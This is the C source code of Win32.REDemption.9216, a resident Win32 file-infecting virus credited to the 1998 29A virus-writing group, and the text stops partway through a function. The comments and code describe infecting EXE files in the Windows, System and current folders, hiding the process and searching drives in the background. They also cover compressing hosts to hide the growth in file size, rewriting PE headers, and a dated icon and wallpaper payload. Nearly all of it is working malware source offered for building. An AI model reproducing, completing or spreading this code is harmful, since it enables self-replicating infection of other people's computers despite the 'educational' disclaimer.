   /*
   Win32.REDemption.9216 virus.
   (c) 1998. Jacky Qwerty/29A.

   Description

   This is a resident HLL (High Level Language) Win32 appender virus
   written in C. It infects all sort of EXE files: DOS EXE files, NE files,
   PE files from Win32 (Win95/NT), etc. Infected files only spread in Win32
   platforms, including Win3.x with Win32s subsystem. The virus infects
   EXE files by changing the pointer at 3Ch in the MZ header which points
   to the new EXE header (if any) placing another pointer to the virus own
   PE header attached at the end of the file. When the virus executes, it
   infects all EXE files from Windows, System and current folder. Then it
   spawns itself as another task (thus staying resident), makes itself
   invisible (thus becoming unloadable) and periodically searches for non-
   infected EXE files in all drives, infecting them in the background.

   Most interesting feature of this virus is that infected files don't
   grow at all, that is, files have same size before and after infection.
   The virus compresses part of its host by using own JQCODING algorithm.
   It also copies host icon to its own resource section to show original icon.
   The virus has no problems related to finding the KERNEL32 base address
   and its API functions. This is because all API functions are imported
   implicitly from the virus own import table. The virus takes special care
   of patching appropriately all RVA and RAW fields from its own PE header,
   including code, data, imports, relocations and resource sections. This
   is needed for the virus to spread succesfully through all kinds of hosts.

   Payload

   On October the 29th, the virus replaces the main icon of all infected
   programs with its own icon, a 29A logo. It also changes default
   desktop wallpaper to such logo.

   To build

   Just run the BUILD.BAT file to build release version. VC++ 6.0 compiler
   was used since it proved to optimize better than Borland's or Watcom's.

   Greets

   Greets go to all 29Aers, especially Vecna and Griyo for all their
   *kickass* stuff and their special effort during this 29A #3 issue.

   Disclaimer

   This source code is provided for educational purposes only. The author is
   NOT responsible in any way, for problems it may cause due to improper use!

   (c) 1998. Jacky Qwerty/29A.
   */

   #define WIN32_LEAN_AND_MEAN

   #include <windows.h>

   #ifdef tsr
   #include "win95sys.h"
   #endif

   #ifdef compr
   #include "jqcoding.h"
   #endif

   #ifdef icon
   #include "winicons.h"
   #include "winres.h"
   #endif


   //constants..

   #ifdef _MSC_VER                                // Microsoft VC++
   #  ifdef release
   #    define DATA_SECTION_RAW    0x200  //0xE00
   #  else
   #    define DATA_SECTION_RAW    0x1400  //0x1600
   #  endif
   #  define COMPILER_DATA         0  //0x30 (VC++4)
   #  define SIZEOF_RESOURCE_DATA  0x504
   #endif

   #ifdef __BORLANDC__                            // Borland C++
   #  ifdef release
   #    define DATA_SECTION_RAW    ?  //0x1000
   #    define COMPILER_DATA       0
   #  else
   #    define DATA_SECTION_RAW    ?  //0x6200
   #    define COMPILER_DATA       0x74
   #  endif
   #  define SIZEOF_RESOURCE_DATA  ?
   #endif

   #define VIRUS_SIZE    (FILE_SIZE - PE_HEADER_OFFSET)

   #define STARTOF_CODEDATA (DATA_SECTION_RAW + COMPILER_DATA -\
                               PE_HEADER_OFFSET)
   #define RawSelfCheck     (STARTOF_CODEDATA + sizeof(szCopyright) - 5)

   #define INIT_VARS_OFFSET (STARTOF_CODEDATA + sizeof(szCopyright) +\
                               sizeof(szExts) + 3 & -4)
   #ifdef tsr
   #define RawProgType      INIT_VARS_OFFSET
   #define RawSrcVir        (RawProgType + 4)
   #else
   #define RawSrcVir        INIT_VARS_OFFSET
   #endif
   #define RawOldPtr2NewEXE (RawSrcVir + 4)
   #define RawOldFileSize   (RawOldPtr2NewEXE + 4)
   #ifdef compr
   #define RawnComprSize    (RawOldFileSize + 4)
   #define RawCipherTarget  (RawnComprSize + 4)
   #define TmpVal RawCipherTarget
   #else
   #define TmpVal RawOldFileSize
   #endif
   #ifdef icon
   #define RawOldResourceAddr  (TmpVal + 4)
   #endif

   #ifndef compr
   #define SIZE_PAD         101
   #endif
   #define READ_ONLY        FALSE
   #define WRITE_ACCESS     TRUE
   #define SIZEOF_FILEEXT   3
   #define MAX_FILESIZE     0x4000000  //64 MB
   #ifdef compr
   #define MIN_FILESIZE     0x4000     //16 KB
   #endif
   #define PREV_LAPSE       3   //1 * 60  //10 * 60  //seconds
   #define SEEK_LAPSE       3   //5       //30       //seconds


   //macros..

   #define Rva2Ptr(Type, Base, RVA) ((Type)((DWORD)(Base) + (DWORD)(RVA)))

   #define IsFile(pFindData) (!((pFindData)->dwFileAttributes &\
                                  FILE_ATTRIBUTE_DIRECTORY))
   #define IsFolder(pFindData) (!IsFile(pFindData) &&\
                                   (pFindData)->cFileName[0] != '.')

   #define PushVar(Object) __asm push (Object)
   #define PopVar(Object) __asm pop (Object)


   //type definitions..

   #ifdef tsr
   typedef BYTE PROG_TYPE, *PPROG_TYPE;
   #define TSR_COPY        0
   #define HOST_COPY       1
   #endif

   typedef BYTE BOOLB;

   typedef struct _IMAGE_RELOCATION_DATA {  // not defined in winnt.h
     WORD RelocOffset :12;
     WORD RelocType   :4;
   } IMAGE_RELOCATION_DATA, *PIMAGE_RELOCATION_DATA;

   #ifdef icon
   typedef struct _ICONIMAGES {
     PICONIMAGE pLargeIcon;
     PICONIMAGE pSmallIcon;
   } ICONIMAGES, *PICONIMAGES;
   #endif


   //global variables..

   BYTE szCopyright[] = "(c) Win32.REDemption (C ver.1.0) by JQwerty/29A",
        szExts[] = "eXeSCr";
   #ifdef tsr
   PROG_TYPE ProgType = HOST_COPY;
   #endif
   DWORD SrcVir = PE_HEADER_OFFSET, OldPtr2NewEXE = 1, OldFileSize = FILE_SIZE;
   #ifdef compr
   DWORD nComprSize = 1, CipherTarget = 1;
   #endif
   #ifdef icon
   DWORD OldResourceAddr = RESOURCE_SECTION_RVA;
   #include "jq29aico.h"
   #endif
   DWORD ExitCode = 0;
   #ifndef compr
   DWORD _TgtVir;
   #else
   DWORD CipherSource;
   #endif
   DWORD _RvaDelta;
   HANDLE hHandle1, hHandle2;
   BYTE PathName[MAX_PATH], HostName[MAX_PATH], TmpName[MAX_PATH];
   WIN32_FIND_DATA FindData, FindDataTSR;
   STARTUPINFO StartupInfo = { 0 };
   PROCESS_INFORMATION ProcessInfo;
   PIMAGE_DOS_HEADER pMZ, pHostMZ;
   PIMAGE_NT_HEADERS _pHostPE;
   #ifdef msgbox
   BOOLB CancelFolderSeek = FALSE, CancelFileSeek = FALSE;
   #ifdef tsr
   HANDLE hMutex;
   #endif
   #endif
   #ifdef icon
   BOOLB bPayLoadDay = FALSE;
   PIMAGE_RESOURCE_DIRECTORY pRsrcStart;
   BYTE HostLargeIcon[SIZEOF_LARGE_ICON];
   BYTE HostSmallIcon[SIZEOF_SMALL_ICON];
   #endif
   #ifdef compr
   BYTE ComprMem[0x10000];
   #ifdef icon
   #define SIZEOF_BMP 0x8076 //32Kb + Bitmap header..
   BYTE jq29aBmp[SIZEOF_BMP] = { 0 };
   #endif
   #endif

   #define sz29A (szCopyright + sizeof(szCopyright) - 4)
   #define szJQ (szCopyright + sizeof(szCopyright) - 12)


   //function declarations..

   VOID  Win32Red(VOID);
   BOOLB OpenMapFile(PBYTE FileName, BOOLB WriteAccess);
   VOID  CloseTruncFile(BOOLB WriteAccess);
   VOID  InfectPath(PBYTE PathName, DWORD cBytes);
   VOID  CloseUnmapFile(BOOLB WriteAccess);
   PBYTE GetEndOfPath(PBYTE pTgt, PBYTE pSr);
   PVOID Rva2Raw(DWORD Rva);
   #ifdef icon
   VOID  FixResources(PIMAGE_RESOURCE_DIRECTORY pRsrcDir);
   VOID  GetDefaultIcons(PICONIMAGES pIconImages,
                         PVOID pNEorPE);
   #endif
   #ifdef tsr
   VOID  ExecTemp(PROG_TYPE ProgType);
   __inline VOID  SeekTSR(VOID);
   VOID  WalkFolder(PBYTE PathName);
   VOID  HideProcess(VOID);
   __inline PPROCESS_DATABASE GetProcessDB(VOID);
   __inline PTHREAD_DATABASE  GetThreadDB(VOID);
   #else
   __inline VOID ExecTemp(VOID);
   #endif


   //function definitions..

   VOID Win32Red() {
     #ifdef tsr
     #ifndef msgbox
       HANDLE hMutex;
     #endif
     HideProcess();
     #endif
     #ifdef icon
     #include "payload.c"
     #endif
     if (GetModuleFileName(0, HostName, MAX_PATH) &&
         OpenMapFile(HostName, READ_ONLY)) {
       pHostMZ = pMZ;
       PushVar(hHandle1);  //better pushin/popin than usin a temp. var.
       PushVar(hHandle2);  //better pushin/popin than usin a temp. var.
       SrcVir += (DWORD)pMZ;
       #ifdef tsr
       if (ProgType != TSR_COPY) {
         #ifdef msgbox
         MessageBox(NULL, "Non-resident stage..", szCopyright, MB_OK);
         #endif
       #endif
         #ifdef compr
         PushVar(nComprSize);
         PushVar(CipherTarget);
         #endif
         InfectPath(PathName, GetWindowsDirectory(PathName, 0x7F));
         InfectPath(PathName, GetSystemDirectory(PathName, 0x7F));
         InfectPath(PathName, (*PathName = '.', 1));
         #ifdef compr
         PopVar(CipherTarget);
         PopVar(nComprSize);
         #endif
       #ifdef tsr
       }
       else {
         if ((hMutex = CreateMutex(NULL, FALSE, szJQ)))
           if (GetLastError() == ERROR_ALREADY_EXISTS)
           #if 1
           #ifdef msgbox
             MessageBox(NULL, "TSR: Mutex exists!", szCopyright, MB_OK),
           #endif
           #endif
             CloseHandle(hMutex),
             ExitProcess(ExitCode);
           #if 1
           #ifdef msgbox
           else
             MessageBox(NULL, "TSR: Mutex created!", szCopyright, MB_OK);
           #endif
           #endif
         #ifdef msgbox
         MessageBox(NULL, "Resident stage..", szCopyright, MB_OK);
         #endif
         SeekTSR();
         #ifdef msgbox
         MessageBox(NULL, "TSR: bye bye..", szCopyright, MB_OK);
         #endif
       }
       #endif
       PopVar(hHandle2);   //better pushin/popin than usin a temp. var.
       PopVar(hHandle1);   //better pushin/popin than usin a temp. var.
       pMZ = pHostMZ;
       CloseUnmapFile(READ_ONLY);
       #ifdef tsr
       if (ProgType != TSR_COPY) {
         if ((hMutex = OpenMutex(MUTEX_ALL_ACCESS, FALSE, szJQ)))
           #ifndef msgbox
           CloseHandle(hMutex);
           #else
           CloseHandle(hMutex),
           MessageBox(NULL, "HOST: Mutex exists!", szCopyright, MB_OK);
           #endif
         else
           if (GetTempPath(MAX_PATH, PathName) - 1 < MAX_PATH - 1)
             #ifdef msgbox
             MessageBox(NULL, "HOST: Mutex doesn't exist!",
                        szCopyright, MB_OK),
             #endif
             ExecTemp(TSR_COPY);
         GetEndOfPath(PathName, HostName);
         ExecTemp(HOST_COPY);
       }
       #else
       GetEndOfPath(PathName, HostName);
       ExecTemp();
       #endif
     }
     ExitProcess(ExitCode);
   }

   #ifdef tsr
   VOID ExecTemp(PROG_TYPE ProgType) {
   #else
   __inline VOID ExecTemp() {
   #endif
     PBYTE pSrc, szCmdLine;
     HANDLE hFindFile;
     #ifdef compr
     BOOLB DecomprOK = TRUE;
     #endif
     #ifdef tsr
     DWORD cBytes;
     if (ProgType == TSR_COPY) {
       if (PathName[(cBytes = lstrlen(PathName)) - 1] != '\\')
         PathName[cBytes++] = '\\';
       *(PDWORD)(PathName + cBytes) = '*A92';
       *(PDWORD)(PathName + cBytes + 4) = '*.';
       if ((hFindFile = FindFirstFile(PathName, &FindData)) !=
             INVALID_HANDLE_VALUE) {
         do {
           lstrcpy(PathName + cBytes, FindData.cFileName);
           DeleteFile(PathName);
         } while (FindNextFile(hFindFile, &FindData));
         FindClose(hFindFile);
       }
       PathName[cBytes] = '\x0';
     }
     #endif
     if (!(cBytes = lstrlen(PathName),
           GetTempFileName(PathName, sz29A, 0, PathName)) &&
         (GetTempPath(MAX_PATH, PathName) - 1 >= MAX_PATH - 1 ||
         !(cBytes = lstrlen(PathName),
           GetTempFileName(PathName, sz29A, 0, PathName))))
       return;
     if (ProgType != TSR_COPY)
     for (;;) {
       pSrc = PathName + lstrlen(lstrcpy(TmpName, PathName));
       while (*--pSrc != '.'); *(PDWORD)(pSrc + 1) = 'EXE';
       if (MoveFile(TmpName, PathName))
         break;
       DeleteFile(TmpName);
       PathName[cBytes] = '\x0';
       if (!GetTempFileName(PathName, sz29A, 0, PathName))
         return;
     }
     if (CopyFile(HostName, PathName, FALSE) &&
         SetFileAttributes(PathName, FILE_ATTRIBUTE_NORMAL) &&
         (hFindFile = FindFirstFile(HostName, &FindData)) !=
           INVALID_HANDLE_VALUE) {
       if (OpenMapFile(PathName, WRITE_ACCESS)) {
         #ifdef tsr
         if (ProgType != TSR_COPY) {
         #endif
           pMZ->e_lfanew = OldPtr2NewEXE;
           #ifndef compr
           FindData.nFileSizeLow = OldFileSize;
           #else
           #ifdef msgbox
           #if 0
           MessageBox(NULL, "Host decoding is about to start..",
                      szCopyright, MB_OK);
           #endif
           #endif
           if (jq_decode(Rva2Ptr(PBYTE, pMZ, OldFileSize),
                         Rva2Ptr(PBYTE, pMZ, CipherTarget + nComprSize),
                         nComprSize,
                         ComprMem) != OldFileSize - CipherTarget) {
             DecomprOK = FALSE;
             #ifdef msgbox
             #if 1
             MessageBox(NULL, "Decode error: File is corrupt!",
                        szCopyright, MB_OK);
             #endif
             #if 0
           }
           else {
             MessageBox(NULL, "Host decoded succesfully!",
                        szCopyright, MB_OK);
             #endif
             #endif
           }
           #endif
         #ifdef tsr
         }
         else
           *Rva2Ptr(PPROG_TYPE,
                    Rva2Ptr(PIMAGE_NT_HEADERS, pMZ, pMZ->e_lfanew),
                    RawProgType) = TSR_COPY;
         #endif
         #ifndef compr
         UnmapViewOfFile(pMZ);
         CloseTruncFile(WRITE_ACCESS);
         #else
         CloseUnmapFile(WRITE_ACCESS);
         if (DecomprOK) {
         #endif
         pSrc = GetCommandLine(); while (*++pSrc != 0x20 && *pSrc);
         if ((szCmdLine = (PBYTE)GlobalAlloc(LPTR, MAX_PATH
                                                     + lstrlen(pSrc) + 1))) {
           lstrcat(lstrcpy(szCmdLine, PathName), pSrc);
           (BYTE)StartupInfo.cb = sizeof(STARTUPINFO);
           if (CreateProcess(NULL, szCmdLine, NULL, NULL, FALSE,
                             CREATE_NEW_CONSOLE, NULL, NULL,
                             &StartupInfo, &ProcessInfo)) {
             #ifdef tsr
             if (ProgType != TSR_COPY) {
             #endif
               WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
               GetExitCodeProcess(ProcessInfo.hProcess, &ExitCode);
               CloseHandle(ProcessInfo.hThread);
               CloseHandle(ProcessInfo.hProcess);
             #ifdef tsr
             }
             #endif
           }
           GlobalFree(szCmdLine);
         }
         #ifdef compr
         }
         #endif
       }
       FindClose(hFindFile);
     }
     DeleteFile(PathName);
   }

   BOOLB OpenMapFile(PBYTE FileName, BOOLB WriteAccess) {
     #ifndef compr
     DWORD NewFileSize;
     #endif
     hHandle1 = CreateFile(FileName,
                           WriteAccess
                             ? GENERIC_READ | GENERIC_WRITE
                             : GENERIC_READ,
                           FILE_SHARE_READ,
                           NULL,
                           OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL,
                           0);
     if (hHandle1 == INVALID_HANDLE_VALUE)
       return FALSE;
     hHandle2 = CreateFileMapping(hHandle1,
                                  NULL,
                                  WriteAccess ? PAGE_READWRITE : PAGE_READONLY,
                                  0,
                                  #ifdef compr
                                  0,
                                  #else
                                  WriteAccess
                                    ? NewFileSize =
                                        (((_TgtVir =
                                            (FindData.nFileSizeLow + 0x1FF &
                                              -0x200)
                                            + PE_HEADER_OFFSET)
                                          + (VIRUS_SIZE + SIZE_PAD - 1))
                                        / SIZE_PAD) * SIZE_PAD
                                    : 0,
                                  #endif
                                  NULL);
     if (!hHandle2) {
       CloseHandle(hHandle1);
       return FALSE;
     }
     pMZ = MapViewOfFile(hHandle2,
                         WriteAccess ? FILE_MAP_WRITE : FILE_MAP_READ,
                         0,
                         0,
                         #ifdef compr
                         0
                         #else
                         WriteAccess ? NewFileSize : 0
                         #endif
                        );
     if (!pMZ) {
       CloseTruncFile(WriteAccess);
       return FALSE;
     }
     return TRUE;
   }

   VOID CloseTruncFile(BOOLB WriteAccess) {
     CloseHandle(hHandle2);
     if (WriteAccess) {
       #ifndef compr
       SetFilePointer(hHandle1, FindData.nFileSizeLow, NULL, FILE_BEGIN);
       SetEndOfFile(hHandle1);
       #endif
       SetFileTime(hHandle1, NULL, NULL, &FindData.ftLastWriteTime);
     }
     CloseHandle(hHandle1);
   }

   VOID InfectPath(PBYTE PathName, DWORD cBytes) {
     PBYTE pSrc, pTgt, pExt, pEndRelocs, pRelocBase;
     #ifdef compr
     PBYTE pComprBuf;
     SYSTEMTIME SystemTime;
     #endif
     DWORD FileExt, TgtVir, RvaDelta, RawDelta, nCount, nSections, nRvas;
     PIMAGE_SECTION_HEADER pSectionHdr;
     PIMAGE_NT_HEADERS pPE, pHostPE;
     PIMAGE_BASE_RELOCATION pRelocs;
     PIMAGE_RELOCATION_DATA pRelocData;
     PIMAGE_IMPORT_DESCRIPTOR pImports;
     PIMAGE_THUNK_DATA pImportData;
     HANDLE hFindFile;
     BOOLB Infect, bValidHeader;
     #ifdef icon
     ICONIMAGES IconImages;
     #endif
     if (0x7F <= cBytes - 1) return;
     if (PathName[cBytes - 1] != '\\') PathName[cBytes++] = '\\';
     *(PDWORD)(PathName + cBytes) = '*.*';
     #ifdef msgbox
     switch (MessageBox(NULL, PathName, szCopyright,
                        MB_YESNOCANCEL | MB_ICONEXCLAMATION)) {
       case IDCANCEL:
         CancelFolderSeek = TRUE;
       case IDNO:
         return;
     }
     #endif
     if ((hFindFile = FindFirstFile(PathName, &FindData)) ==
           INVALID_HANDLE_VALUE)
       return;
     do {
       {
       #ifdef compr
       BYTE KeySecond, TmpKeySec;
       #endif
       if (!IsFile(&FindData) || FindData.nFileSizeHigh ||
           #ifdef compr
           FindData.nFileSizeLow < MIN_FILESIZE ||
           #endif
           (FindData.nFileSizeLow & -MAX_FILESIZE) ||
           #ifndef compr
           !(FindData.nFileSizeLow % SIZE_PAD)
           #else
           (FileTimeToSystemTime(&FindData.ftLastWriteTime, &SystemTime),
           TmpKeySec =
             (BYTE)(((BYTE)SystemTime.wYear - (BYTE)SystemTime.wMonth +
                     (BYTE)SystemTime.wDay - (BYTE)SystemTime.wHour +
                     (BYTE)SystemTime.wMinute ^ 0x6A) & 0x3E),
            KeySecond = TmpKeySec < 60 ? TmpKeySec : TmpKeySec - 4,
            KeySecond == (BYTE)SystemTime.wSecond)
           #endif
          )
         continue;
       #ifdef compr
       (BYTE)SystemTime.wSecond = KeySecond;
       #endif
       }
       pTgt = lstrcpy(PathName + cBytes, FindData.cFileName)
                + lstrlen(FindData.cFileName);
       FileExt = *(PDWORD)(pTgt - SIZEOF_FILEEXT) & ~0xFF202020;
       pExt = szExts;
       do {
         if (FileExt != (*(PDWORD)pExt & ~0xFF202020) ||
             pTgt[- 1 - SIZEOF_FILEEXT] != '.' ||
             !OpenMapFile(PathName, READ_ONLY))
           continue;
         Infect = FALSE;
         #ifdef compr
         pComprBuf = NULL;
         #endif
         if (pMZ->e_magic == IMAGE_DOS_SIGNATURE) {
           bValidHeader = FALSE;
           pPE = Rva2Ptr(PIMAGE_NT_HEADERS, pMZ, pMZ->e_lfanew);
           if ((DWORD)pMZ < (DWORD)pPE &&
               (DWORD)pPE < Rva2Ptr(DWORD,
                                    pMZ,
                                    FindData.nFileSizeLow)
                            - 0x7F &&
               (bValidHeader = TRUE,
                pPE->Signature == IMAGE_NT_SIGNATURE &&
                *Rva2Ptr(PDWORD, pPE, RawSelfCheck) == 'A92/')) {
           } else {
             #ifndef compr
               Infect = TRUE;
             #else
             {
             DWORD nMaxComprSize;
             if ((pComprBuf =
                    (PBYTE)GlobalAlloc(
                             LPTR,
                             nMaxComprSize =
                               FindData.nFileSizeLow / 8 * 9 + 12
                           )
                 )) {
               #ifdef msgbox
               #if 0
               MessageBox(NULL, "Host encoding is about to start..",
                          FindData.cFileName, MB_OK);
               #endif
               #endif
               nComprSize =
                 jq_encode(pComprBuf + nMaxComprSize,
                           Rva2Ptr(PBYTE, pMZ, FindData.nFileSizeLow),
                           FindData.nFileSizeLow - sizeof(IMAGE_DOS_HEADER),
                           ComprMem);
               TgtVir = (CipherTarget + nComprSize - PE_HEADER_OFFSET
                          + 0x1FF & -0x200) + PE_HEADER_OFFSET;
               if (TgtVir + VIRUS_SIZE - 1 < FindData.nFileSizeLow)
                 #ifdef msgbox
                 #if 0
                 MessageBox(NULL, "Host encoded succesfully!",
                            FindData.cFileName, MB_OK),
                 #endif
                 #endif
                 Infect = TRUE;
               #ifdef msgbox
               #if 0
               else
                 MessageBox(NULL, "Host encoded succesfully, but "
                                  "Win32.RED code didn't fit, "
                                  "skipping file..",
                            FindData.cFileName, MB_OK);
               #endif
               #endif
             }
             }
             #endif
           }
         }
         CloseUnmapFile(READ_ONLY);
         if (!Infect || !SetFileAttributes(PathName, FILE_ATTRIBUTE_NORMAL)) {
           #ifdef compr
           if (pComprBuf) GlobalFree(pComprBuf);
           #endif
           continue;
         }
         #ifdef msgbox
         switch (MessageBox(NULL, PathName, szCopyright,
                            MB_YESNOCANCEL | MB_ICONEXCLAMATION)) {
           case IDCANCEL:
             CancelFileSeek = TRUE; break;
           case IDYES:
         #endif
         if (OpenMapFile(PathName, WRITE_ACCESS)) {
           #ifdef icon
           IconImages.pLargeIcon = NULL;
           IconImages.pSmallIcon = NULL;
           if (!bPayLoadDay && bValidHeader) {
             GetDefaultIcons(&IconImages,
                             Rva2Ptr(PVOID, pMZ, pMZ->e_lfanew));
             if (IconImages.pLargeIcon) {
               pSrc = (PBYTE)IconImages.pLargeIcon;
               pTgt = HostLargeIcon;
               nCount = SIZEOF_LARGE_ICON;
               do *pTgt++ = *pSrc++; while (--nCount);
               if (IconImages.pSmallIcon) {
                 pSrc = (PBYTE)IconImages.pSmallIcon;
                 nCount = SIZEOF_SMALL_ICON;
                 do *pTgt++ = *pSrc++; while (--nCount);
               }
             }
           }
           #endif
           #ifdef compr
           pTgt = Rva2Ptr(PBYTE, pMZ, CipherTarget);
           pSrc = (PBYTE)CipherSource;
           nCount = nComprSize;
           do *pTgt++ = *pSrc++; while (--nCount);
           GlobalFree(pComprBuf); pComprBuf = NULL;  //This line is optional
           _pHostPE = pHostPE = Rva2Ptr(PIMAGE_NT_HEADERS,
                                        pMZ,
                                        TgtVir);
           #else
           _pHostPE = pHostPE = Rva2Ptr(PIMAGE_NT_HEADERS, //The comented code
                                        pMZ,               //  below generates
                                        TgtVir = _TgtVir); //  more bytez than
           #endif                                          //  this code becoz
           pTgt = (PBYTE)pHostPE;                          //  the linker adds
           pSrc = (PBYTE)SrcVir;                           //  other functionz
           nCount = VIRUS_SIZE;                            //  not needed!
           do *pTgt++ = *pSrc++; while (--nCount);         //

   //        CopyMemory((PBYTE)(pHostPE = Rva2Ptr(PIMAGE_NT_HEADERS, //Not in
   //                                             pMZ,               //any DLL
   //                                             TgtVir)),          //but in
   //                   (PBYTE)SrcVir,                               //a RTL.
   //                   VIRUS_SIZE);                                 //

           #ifdef tsr
           if (ProgType == TSR_COPY)
             *Rva2Ptr(PPROG_TYPE, pHostPE, RawProgType) = HOST_COPY;
           #endif
           *Rva2Ptr(PDWORD, pHostPE, RawSrcVir) = TgtVir;
           *Rva2Ptr(PDWORD, pHostPE, RawOldPtr2NewEXE) = pMZ->e_lfanew;
           *Rva2Ptr(PDWORD, pHostPE, RawOldFileSize) = FindData.nFileSizeLow;
           #ifdef compr
           *Rva2Ptr(PDWORD, pHostPE, RawnComprSize) = nComprSize;
           *Rva2Ptr(PDWORD, pHostPE, RawCipherTarget) = CipherTarget;
           #endif

           _RvaDelta = RvaDelta =
             ((pHostPE->OptionalHeader.SizeOfHeaders +=
                 (RawDelta = TgtVir - pHostMZ->e_lfanew))
               + 0xFFF & -0x1000)
             - pHostPE->OptionalHeader.BaseOfCode;

           // fix RVAs in PE header..

           pHostPE->OptionalHeader.AddressOfEntryPoint += RvaDelta;
           pHostPE->OptionalHeader.BaseOfCode += RvaDelta;
           pHostPE->OptionalHeader.BaseOfData += RvaDelta;
           pSectionHdr = IMAGE_FIRST_SECTION(pHostPE);
           nSections = pHostPE->FileHeader.NumberOfSections;
           do {
             pSectionHdr->PointerToRawData += RawDelta;
             pSectionHdr++->VirtualAddress += RvaDelta;
           } while (--nSections);
           pHostPE->OptionalHeader.SizeOfImage =
             (pSectionHdr - 1)->VirtualAddress
             + (pSectionHdr - 1)->Misc.VirtualSize
             + 0xFFF & -0x1000;
           nRvas = pHostPE->OptionalHeader.NumberOfRvaAndSizes;
           do {
             if (!pHostPE->OptionalHeader.DataDirectory[--nRvas].
                           VirtualAddress)
               continue;
             pHostPE->OptionalHeader.DataDirectory[nRvas].
                      VirtualAddress += RvaDelta;
           } while (nRvas);

           // fix RVAs in code & reloc section..

           pEndRelocs =
             Rva2Ptr(
               PBYTE,
               (pRelocs =
                  Rva2Raw(pHostPE->OptionalHeader.
                          DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].
                          VirtualAddress)),
               pHostPE->OptionalHeader.
                        DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].
                        Size - IMAGE_SIZEOF_BASE_RELOCATION);
           do {
             pRelocBase = Rva2Raw(pRelocs->VirtualAddress += RvaDelta);
             pRelocData = (PIMAGE_RELOCATION_DATA)(pRelocs + 1);
             (DWORD)pRelocs += pRelocs->SizeOfBlock;
             do {
               if (pRelocData->RelocType != IMAGE_REL_BASED_HIGHLOW)
                 continue;
               *Rva2Ptr(PDWORD,
                        pRelocBase,
                        pRelocData->RelocOffset) += RvaDelta;
             } while ((DWORD)++pRelocData < (DWORD)pRelocs);
           } while ((DWORD)pRelocs < (DWORD)pEndRelocs);

           // fix RVAs in import section..

           pImports =
             Rva2Raw(pHostPE->OptionalHeader.
                              DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].
                              VirtualAddress);
           do {
             pImportData =
               #ifdef _MSC_VER
               Rva2Raw((DWORD)pImports->OriginalFirstThunk += RvaDelta);
               #endif
               #ifdef __BORLANDC__
               Rva2Raw((DWORD)pImports->u.OriginalFirstThunk += RvaDelta);
               #endif
             if ((DWORD)pImportData)
               do {
                 (DWORD)pImportData->u1.AddressOfData += RvaDelta;
               } while ((DWORD)(++pImportData)->u1.AddressOfData);
             pImports->Name += RvaDelta;
             pImportData = Rva2Raw((DWORD)pImports->FirstThunk += RvaDelta);
             do {
               (DWORD)pImportData->u1.AddressOfData += RvaDelta;
             } while ((DWORD)(++pImportData)->u1.AddressOfData);
           } while((++pImports)->Name);

           #ifdef icon
           // fix RVAs in resource section..

           pRsrcStart =
             Rva2Raw(pHostPE->OptionalHeader.
                              DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].
                              VirtualAddress = (*Rva2Ptr(PDWORD,
                                                         pHostPE,
                                                         RawOldResourceAddr)
                                                  += RvaDelta));
           ((PBYTE)pRsrcStart)[0x2E] = 2;
           ((PBYTE)pRsrcStart)[0x4E4] = 2;
           FixResources(pRsrcStart);

           if (IconImages.pLargeIcon || bPayLoadDay) {
             pHostPE->OptionalHeader.
                      DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].
                      Size = SIZEOF_RESOURCE_DATA;
             pTgt = (PBYTE)pRsrcStart + 0xD0;
             pSrc = HostLargeIcon;
             nCount = SIZEOF_LARGE_ICON;
             do *pTgt++ = *pSrc++; while (--nCount);
             if (IconImages.pSmallIcon || bPayLoadDay) {
               nCount = SIZEOF_SMALL_ICON;
               do *pTgt++ = *pSrc++; while (--nCount);
             }
             else {
               ((PBYTE)pRsrcStart)[0x2E] = 1;
               ((PBYTE)pRsrcStart)[0x4E4] = 1;
             }
           }
           else {
             pHostPE->OptionalHeader.
                      DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].
                      VirtualAddress = 0;
             pHostPE->OptionalHeader.
                      DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].
                      Size = 0;
           }
           #endif

           pMZ->e_lfanew = TgtVir;
           #ifdef compr
           SystemTimeToFileTime(&SystemTime, &FindData.ftLastWriteTime);
           #endif
           CloseUnmapFile(WRITE_ACCESS);
         }
         #ifdef msgbox
         }
         #endif
         SetFileAttributes(PathName, FindData.dwFileAttributes);
         #ifdef msgbox
         if (CancelFileSeek) {
           CancelFileSeek = FALSE;
           goto BreakHere;  //can't use break; because of the 2 while's.
         }
         #endif
         #ifdef compr
         if (pComprBuf) GlobalFree(pComprBuf);
         #endif
       } while (*(pExt += SIZEOF_FILEEXT));
     } while (FindNextFile(hFindFile, &FindData));
     #ifdef msgbox
     BreakHere:
     #endif
     FindClose(hFindFile);
   }

   VOID CloseUnmapFile(BOOLB WriteAccess) {
     UnmapViewOfFile(pMZ);
     #ifndef compr
     CloseHandle(hHandle2);
     if (WriteAccess)
       SetFileTime(hHandle1, NULL, NULL, &FindData.ftLastWriteTime);
     CloseHandle(hHandle1);
     #else
     CloseTruncFile(WriteAccess);
     #endif
   }

   PBYTE GetEndOfPath(PBYTE pTgt, PBYTE pSr) {
     PBYTE pTgtBegin = pTgt, pSrEnd = pSr;
     while (*pSrEnd++);
     while (pSr < --pSrEnd && pSrEnd[-1] != '\\' && pSrEnd[-1] != ':');
     while (pSr < pSrEnd) *pTgt++ = *pSr++;
     if (pTgtBegin == pTgt || pTgt[-1] != '\\') *((PWORD)pTgt)++ = '.\\';
     *pTgt = '\x0'; return(pTgt);
   }

   PVOID Rva2Raw(DWORD Rva) {
     PIMAGE_SECTION_HEADER pSectionHdr = IMAGE_FIRST_SECTION(_pHostPE);
     DWORD nSections = _pHostPE->FileHeader.NumberOfSections;
     do {
       if (pSectionHdr->VirtualAddress <= Rva &&
           Rva < pSectionHdr->VirtualAddress + pSectionHdr->Misc.VirtualSize)
         return (PVOID)(Rva - pSectionHdr->VirtualAddress
                        + pSectionHdr->PointerToRawData
                        + (DWORD)pMZ);
       pSectionHdr++;
     } while (--nSections);
     return NULL;
   }

   #ifdef icon
   VOID FixResources(PIMAGE_RESOURCE_DIRECTORY pRsrcDir) {
     PIMAGE_RESOURCE_DIRECTORY_ENTRY pRsrcDirEntry;
     DWORD nCount;
     if (!pRsrcDir)
       return;
